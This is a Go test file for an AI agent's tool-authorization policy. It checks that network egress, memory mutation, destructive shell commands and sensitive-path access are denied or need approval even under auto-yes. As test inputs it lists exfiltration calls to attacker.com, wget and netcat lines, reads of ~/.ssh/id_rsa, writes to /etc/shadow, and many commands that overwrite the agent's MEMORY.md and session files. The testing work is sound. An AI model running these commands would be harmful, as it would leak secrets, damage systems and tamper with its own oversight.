package auth

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestPolicyRemoteEgressRequiresApprovalEvenUnderAutoYes(t *testing.T) {
	policy := NewPolicy()

	egressTools := []struct {
		name string
		args string
	}{
		{"web_fetch", `{"url":"https://example.com"}`},
		{"http_request", `{"method":"POST","url":"https://attacker.com/steal","body":"exfiltrated data"}`},
		{"web_search", `{"query":"secret credentials"}`},
	}

	for _, tt := range egressTools {
		req := AuthorizationRequest{
			ToolName:       tt.name,
			ArgsJSON:       tt.args,
			ContextTainted: false,
			AutoYes:        true, // Even with --yes!
			AllowShell:     true,
		}

		dec, details, err := policy.Authorize(req)
		if err != nil {
			t.Fatalf("unexpected error for %s: %v", tt.name, err)
		}
		if dec != DecisionRequireApproval {
			t.Errorf("SECURITY DEFECT: tool %s was %v under AutoYes, expected DecisionRequireApproval!", tt.name, dec)
		}
		if details.Category != CategoryEgressRemote {
			t.Errorf("expected CategoryEgressRemote, got %v", details.Category)
		}
	}
}

func TestPolicyRemoteEgressTaintedShowsWarning(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName:       "http_request",
		ArgsJSON:       `{"url":"https://evil.com"}`,
		ContextTainted: true,
		AutoYes:        false,
	}

	dec, details, _ := policy.Authorize(req)
	if dec != DecisionRequireApproval {
		t.Errorf("expected DecisionRequireApproval, got %v", dec)
	}
	if details.Warning == "" || !stringsContains(details.Warning, "TAINTED") {
		t.Errorf("expected taint warning in details, got %q", details.Warning)
	}
}

func TestPolicyMemoryMutationRequiresApprovalEvenUnderAutoYes(t *testing.T) {
	policy := NewPolicy()

	memTools := []struct {
		name string
		args string
	}{
		{"save_memory", `{"content":"# New Memory"}`},
		{"patch_memory", `{"section":"Projects","content":"New Project"}`},
	}

	for _, tt := range memTools {
		req := AuthorizationRequest{
			ToolName:       tt.name,
			ArgsJSON:       tt.args,
			ContextTainted: false,
			AutoYes:        true, // Even with --yes!
		}

		dec, details, err := policy.Authorize(req)
		if err != nil {
			t.Fatalf("unexpected error for %s: %v", tt.name, err)
		}
		if dec != DecisionRequireApproval {
			t.Errorf("SECURITY DEFECT: %s memory mutation was %v under AutoYes, expected DecisionRequireApproval!", tt.name, dec)
		}
		if details.Category != CategoryMutateMemory {
			t.Errorf("expected CategoryMutateMemory, got %v", details.Category)
		}
	}
}

func TestPolicyShellDisabledWhenAllowShellFalse(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName:   "shell",
		ArgsJSON:   `{"command":"ls"}`,
		AllowShell: false,
	}

	dec, _, err := policy.Authorize(req)
	if dec != DecisionDeny {
		t.Errorf("expected DecisionDeny when AllowShell=false, got %v", dec)
	}
	if err == nil {
		t.Errorf("expected error when AllowShell=false, got nil")
	}
}

func TestPolicyShellBlockedCommands(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName:        "shell",
		ArgsJSON:        `{"command":"sudo reboot"}`,
		AllowShell:      true,
		BlockedCommands: []string{"sudo", "su", "shutdown"},
	}

	dec, _, err := policy.Authorize(req)
	if dec != DecisionDeny {
		t.Errorf("expected DecisionDeny for blocked command sudo, got %v", dec)
	}
	if err == nil {
		t.Errorf("expected error for blocked command, got nil")
	}
}

func TestPolicyShellDestructiveRequiresStrongApproval(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName:   "shell",
		ArgsJSON:   `{"command":"rm -rf /tmp/test"}`,
		AllowShell: true,
		AutoYes:    true, // Must not bypass!
	}

	dec, details, err := policy.Authorize(req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec != DecisionRequireStrongApproval {
		t.Errorf("expected DecisionRequireStrongApproval for rm -rf, got %v", dec)
	}
	if !details.RequiresStrong {
		t.Errorf("expected RequiresStrong=true")
	}
}

func TestPolicyShellMutatingRequiresApprovalNotBypassedByAutoYes(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName:   "shell",
		ArgsJSON:   `{"command":"mkdir /tmp/newdir"}`,
		AllowShell: true,
		AutoYes:    true, // Must not bypass generic mutating command!
	}

	dec, details, err := policy.Authorize(req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec != DecisionRequireApproval {
		t.Errorf("expected DecisionRequireApproval for mkdir, got %v", dec)
	}
	if details.RequiresStrong {
		t.Errorf("mkdir should not require strong approval")
	}
}

func TestPolicyShellReadOnlyAllowedUnderAutoYesWhenUntainted(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName:       "shell",
		ArgsJSON:       `{"command":"ls -la"}`,
		AllowShell:     true,
		AutoYes:        true,
		ContextTainted: false,
	}

	dec, _, err := policy.Authorize(req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec != DecisionAllow {
		t.Errorf("expected DecisionAllow for read-only untainted shell under AutoYes, got %v", dec)
	}

	// But if context is tainted:
	req.ContextTainted = true
	decTainted, _, _ := policy.Authorize(req)
	if decTainted != DecisionRequireApproval {
		t.Errorf("expected DecisionRequireApproval for read-only shell in tainted turn, got %v", decTainted)
	}
}

func TestPolicyWriteFileDeniesSensitivePaths(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName: "write_file",
		ArgsJSON: `{"path":"/etc/shadow","content":"evil"}`,
	}

	dec, _, err := policy.Authorize(req)
	if dec != DecisionDeny {
		t.Errorf("expected DecisionDeny for writing /etc/shadow, got %v", dec)
	}
	if err == nil {
		t.Errorf("expected error for writing sensitive path")
	}
}

func TestPolicyReadFileDeniesSensitivePaths(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName: "read_file",
		ArgsJSON: `{"path":"~/.ssh/id_rsa"}`,
	}

	dec, _, err := policy.Authorize(req)
	if dec != DecisionDeny {
		t.Errorf("expected DecisionDeny for reading ~/.ssh/id_rsa, got %v", dec)
	}
	if err == nil {
		t.Errorf("expected error for reading sensitive path")
	}
}

func TestPolicyUnknownToolFailsClosed(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName: "unknown_hack_tool",
		ArgsJSON: `{}`,
	}

	dec, _, err := policy.Authorize(req)
	if dec != DecisionDeny {
		t.Errorf("expected DecisionDeny for unknown tool, got %v", dec)
	}
	if err == nil {
		t.Errorf("expected error for unknown tool")
	}
}

func TestPolicyWriteFileDeniesMemoryDirectWrite(t *testing.T) {
	policy := NewPolicy()
	req := AuthorizationRequest{
		ToolName: "write_file",
		ArgsJSON: `{"path":"MEMORY.md","content":"# Overwritten"}`,
	}
	dec, _, err := policy.Authorize(req)
	if dec != DecisionDeny {
		t.Errorf("expected DecisionDeny for write_file to MEMORY.md, got %v", dec)
	}
	if err == nil || !strings.Contains(err.Error(), "forbidden") {
		t.Errorf("expected forbidden error message, got: %v", err)
	}
}

func TestPolicyWorkspaceConfinement(t *testing.T) {
	policy := NewPolicy()
	ws := t.TempDir()

	// 1. Write outside workspace with AutoYes must still require approval!
	reqOutside := AuthorizationRequest{
		ToolName:   "write_file",
		ArgsJSON:   `{"path":"/tmp/outside.txt","content":"hello"}`,
		Workspace:  ws,
		AutoYes:    true,
		AllowShell: true,
	}
	dec, details, err := policy.Authorize(reqOutside)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec != DecisionRequireApproval {
		t.Errorf("expected DecisionRequireApproval for write outside workspace, got %v", dec)
	}
	if details.Action != "write_file_outside_workspace" {
		t.Errorf("expected action write_file_outside_workspace, got %s", details.Action)
	}

	// 2. Relative traversal attempt (../../escape.txt)
	reqTraversal := AuthorizationRequest{
		ToolName:   "write_file",
		ArgsJSON:   `{"path":"../../escape.txt","content":"hello"}`,
		Workspace:  ws,
		AutoYes:    true,
		AllowShell: true,
	}
	dec, _, _ = policy.Authorize(reqTraversal)
	if dec != DecisionRequireApproval {
		t.Errorf("expected DecisionRequireApproval for traversal path, got %v", dec)
	}
}

func TestPolicySymlinkTraversalPrevention(t *testing.T) {
	policy := NewPolicy()
	ws := t.TempDir()
	outsideDir := t.TempDir()

	// Create a symlink inside ws pointing to outsideDir
	symlinkPath := filepath.Join(ws, "symlink_dir")
	if err := os.Symlink(outsideDir, symlinkPath); err != nil {
		t.Skipf("symlink not supported on this filesystem: %v", err)
	}

	targetFile := filepath.Join(symlinkPath, "secret.txt")
	req := AuthorizationRequest{
		ToolName:   "write_file",
		ArgsJSON:   fmt.Sprintf(`{"path":%q,"content":"data"}`, targetFile),
		Workspace:  ws,
		AutoYes:    true,
		AllowShell: true,
	}

	dec, details, _ := policy.Authorize(req)
	if dec != DecisionRequireApproval {
		t.Errorf("expected DecisionRequireApproval when writing through symlink escaping workspace, got %v", dec)
	}
	if details.Action != "write_file_outside_workspace" {
		t.Errorf("expected action write_file_outside_workspace, got %s", details.Action)
	}
}

func TestPolicyMutatingCommandsPromptUnderAutoYes(t *testing.T) {
	policy := NewPolicy()

	mutatingCmds := []struct {
		cmd         string
		expectedDec Decision
	}{
		{"mkdir canary_dir", DecisionRequireApproval},
		{"touch canary_file", DecisionRequireApproval},
		{"echo x > canary.txt", DecisionRequireStrongApproval}, // Destructive due to write redirection
		{"cp src.txt dst.txt", DecisionRequireApproval},
	}

	for _, tc := range mutatingCmds {
		req := AuthorizationRequest{
			ToolName:   "shell",
			ArgsJSON:   fmt.Sprintf(`{"command":%q}`, tc.cmd),
			AutoYes:    true, // --yes flag enabled
			AllowShell: true,
		}
		dec, _, err := policy.Authorize(req)
		if err != nil {
			t.Fatalf("unexpected error for %s: %v", tc.cmd, err)
		}
		if dec != tc.expectedDec {
			t.Errorf("command %q under AutoYes: expected decision %v, got %v", tc.cmd, tc.expectedDec, dec)
		}
	}

	// Read-only commands MUST auto-approve under --yes
	readOnlyReq := AuthorizationRequest{
		ToolName:   "shell",
		ArgsJSON:   `{"command":"ls -la"}`,
		AutoYes:    true,
		AllowShell: true,
	}
	decRO, _, errRO := policy.Authorize(readOnlyReq)
	if errRO != nil || decRO != DecisionAllow {
		t.Errorf("read-only command under AutoYes: expected DecisionAllow, got %v (err: %v)", decRO, errRO)
	}
}

func TestPolicyModifyingMemoryOrSessionsDenied(t *testing.T) {
	policy := NewPolicy()
	ws := t.TempDir()

	forbiddenShellCmds := []string{
		"echo 'hacked' > MEMORY.md",
		"echo 'hacked' >> memory.md",
		"cat x > Memory.MD",
		"tee MEMORY.md",
		"sed -i 's/a/b/' MEMORY.md",
		"rm -f MEMORY.md",
		"unlink MEMORY.md",
		"truncate -s 0 MEMORY.md",
		"mv file.txt MEMORY.md",
		"cp file.txt MEMORY.md",
		"cp file.txt sessions/default.json",
		"mv file.txt sessions/default.json",
		"dd if=/dev/zero of=MEMORY.md",
		"dd of=MEMORY.md if=/dev/urandom",
		"dd of=sessions/default.json if=/dev/zero",
		"install -m 644 file.txt MEMORY.md",
		"install file.txt sessions/default.json",
		"ln file.txt MEMORY.md",
		"link file.txt MEMORY.md",
		"ln MEMORY.md hardlink_target",
		"ln -s MEMORY.md canary_link",
		"python3 -c \"open('MEMORY.md', 'w').write('hacked')\"",
		"python -c \"open('sessions/default.json', 'w').write('hacked')\"",
		"perl -e \"open(F, '>MEMORY.md')\"",
		"ruby -e \"File.write('MEMORY.md', 'hacked')\"",
		"node -e \"fs.writeFileSync('MEMORY.md', 'hacked')\"",
		"bash -c \"echo hack > MEMORY.md\"",
		"echo 'corrupt' > sessions/default.json",
		"rm sessions/abc.json",
		"tee sessions/active.json",
	}

	for _, cmd := range forbiddenShellCmds {
		req := AuthorizationRequest{
			ToolName:   "shell",
			ArgsJSON:   fmt.Sprintf(`{"command":%q}`, cmd),
			Workspace:  ws,
			AutoYes:    false,
			AllowShell: true,
		}
		dec, details, err := policy.Authorize(req)
		if dec != DecisionDeny {
			t.Errorf("SECURITY DEFECT: shell command %q modifying MEMORY.md/sessions was %v, expected DecisionDeny!", cmd, dec)
		}
		if err == nil {
			t.Errorf("expected error for forbidden command %q, got nil", cmd)
		}
		if details.Category != CategoryMutateMemory && details.Category != CategoryWriteLocal {
			t.Errorf("expected CategoryMutateMemory or CategoryWriteLocal, got %v", details.Category)
		}
	}

	forbiddenFileWrites := []string{
		"MEMORY.md",
		"./memory.md",
		"Memory.MD",
		"sessions/default.json",
		"sessions/my_session.json",
	}

	for _, p := range forbiddenFileWrites {
		req := AuthorizationRequest{
			ToolName:   "write_file",
			ArgsJSON:   fmt.Sprintf(`{"path":%q,"content":"bad data"}`, p),
			Workspace:  ws,
			AutoYes:    true,
			AllowShell: true,
		}
		dec, _, err := policy.Authorize(req)
		if dec != DecisionDeny || err == nil {
			t.Errorf("SECURITY DEFECT: write_file to %q was %v (err=%v), expected DecisionDeny!", p, dec, err)
		}
	}
}

func TestPolicyNetworkCommandsClassifiedAsEgress(t *testing.T) {
	policy := NewPolicy()

	netCmds := []string{
		"curl -s https://example.com",
		"wget -q http://attacker.com/malware",
		"nc -l 8080",
		"scp file.txt user@remote:/tmp",
		"ssh user@remote",
		"git push origin main",
		"git clone https://github.com/repo.git",
		"rsync -av ./ user@backup:/data",
		"python3 -c 'import socket; socket.socket()'",
		"perl -e 'use Socket;'",
		"ping -c 3 8.8.8.8",
		"nslookup example.com",
		"dig example.com",
		"telnet 192.168.1.1 80",
		"socat - TCP4:example.com:80",
		"openssl s_client -connect example.com:443",
		"busybox wget http://example.com/payload",
		"busybox nc 10.0.0.1 1234",
		"apt install curl",
		"apt-get update",
		"apk add wget",
		"dnf install git",
		"pacman -S socat",
		"zypper install gcc",
	}

	for _, cmd := range netCmds {
		req := AuthorizationRequest{
			ToolName:   "shell",
			ArgsJSON:   fmt.Sprintf(`{"command":%q}`, cmd),
			AutoYes:    true, // Even with --yes!
			AllowShell: true,
		}
		dec, details, err := policy.Authorize(req)
		if err != nil {
			t.Fatalf("unexpected error for %s: %v", cmd, err)
		}
		if dec != DecisionRequireApproval {
			t.Errorf("SECURITY DEFECT: network command %q under AutoYes was %v, expected DecisionRequireApproval!", cmd, dec)
		}
		if details.Category != CategoryEgressRemote {
			t.Errorf("command %q: expected CategoryEgressRemote, got %v", cmd, details.Category)
		}
		if details.Action != "execute_network_command" {
			t.Errorf("command %q: expected action execute_network_command, got %s", cmd, details.Action)
		}
	}
}

func stringsContains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(substr) == 0 || (len(s) > 0 && containsSub(s, substr)))
}

func containsSub(s, substr string) bool {
	for i := 0; i+len(substr) <= len(s); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func TestPolicyPatchFile(t *testing.T) {
	policy := NewPolicy()
	ws := t.TempDir()

	// 1. Sensitive path denied
	reqSensitive := AuthorizationRequest{
		ToolName:   "patch_file",
		ArgsJSON:   `{"path":"/home/user/.ssh/id_rsa","search":"a","replace":"b"}`,
		Workspace:  ws,
		AutoYes:    true,
		AllowShell: true,
	}
	dec, _, err := policy.Authorize(reqSensitive)
	if dec != DecisionDeny || err == nil {
		t.Errorf("expected DecisionDeny for sensitive path patch, got %v", dec)
	}

	// 2. Direct MEMORY.md and session files denied
	forbidden := []string{"MEMORY.md", "./memory.md", "sessions/default.json"}
	for _, f := range forbidden {
		req := AuthorizationRequest{
			ToolName:   "patch_file",
			ArgsJSON:   fmt.Sprintf(`{"path":%q,"search":"a","replace":"b"}`, f),
			Workspace:  ws,
			AutoYes:    true,
			AllowShell: true,
		}
		dec, _, err := policy.Authorize(req)
		if dec != DecisionDeny || err == nil {
			t.Errorf("expected DecisionDeny for patch to %s, got %v", f, dec)
		}
	}

	// 3. Clean turn inside workspace with AutoYes allowed
	localFile := filepath.Join(ws, "code.go")
	reqClean := AuthorizationRequest{
		ToolName:     "patch_file",
		ArgsJSON:     fmt.Sprintf(`{"path":%q,"search":"v1","replace":"v2"}`, localFile),
		Workspace:    ws,
		AutoYes:      true,
		ConfirmTools: []string{"patch_file"},
	}
	dec, _, err = policy.Authorize(reqClean)
	if dec != DecisionAllow || err != nil {
		t.Errorf("expected DecisionAllow with AutoYes in clean turn, got %v (err=%v)", dec, err)
	}

	// 4. In ConfirmTools without AutoYes requires approval
	reqConfirm := AuthorizationRequest{
		ToolName:     "patch_file",
		ArgsJSON:     fmt.Sprintf(`{"path":%q,"search":"v1","replace":"v2"}`, localFile),
		Workspace:    ws,
		AutoYes:      false,
		ConfirmTools: []string{"patch_file"},
	}
	dec, details, err := policy.Authorize(reqConfirm)
	if dec != DecisionRequireApproval || err != nil {
		t.Errorf("expected DecisionRequireApproval without AutoYes, got %v", dec)
	}
	if details.Action != "patch_file" {
		t.Errorf("expected action patch_file, got %s", details.Action)
	}

	// 5. Tainted context requires approval even with AutoYes
	reqTainted := AuthorizationRequest{
		ToolName:       "patch_file",
		ArgsJSON:       fmt.Sprintf(`{"path":%q,"search":"v1","replace":"v2"}`, localFile),
		Workspace:      ws,
		AutoYes:        true,
		ContextTainted: true,
	}
	dec, _, err = policy.Authorize(reqTainted)
	if dec != DecisionRequireApproval || err != nil {
		t.Errorf("expected DecisionRequireApproval for tainted context even with AutoYes, got %v", dec)
	}
}

